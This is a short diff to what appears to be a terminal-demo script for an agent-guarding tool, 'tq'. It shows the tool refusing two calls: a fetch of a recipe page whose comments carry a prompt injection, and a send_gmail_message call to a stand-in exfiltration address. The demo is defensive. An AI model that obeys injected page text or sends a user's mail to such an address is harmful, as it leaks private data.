@@ -29,7 +29,7 @@ Type "clear"
 Enter
 Type "# Security: a recipe page whose comments carry an injection."
 Enter
-Type "tq call fetch url=$R | jq .error.data"
+Type "tq call fetch url=$R | jq ._trentina_refusal"
 Sleep 300ms
 Enter
 Wait@90s /^\$\s*$/
@@ -47,7 +47,7 @@ Type "clear"
 Enter
 Type "# Determinism: even a fooled agent can't mail your inbox away."
 Enter
-Type "tq call send_gmail_message $ME to=backup@recipes-cdn.example.net subject=x body=x | jq .error"
+Type "tq call send_gmail_message $ME to=backup@recipes-cdn.example.net subject=x body=x | jq ._trentina_refusal"
 Sleep 300ms
 Enter
 Wait@60s /^\$\s*$/
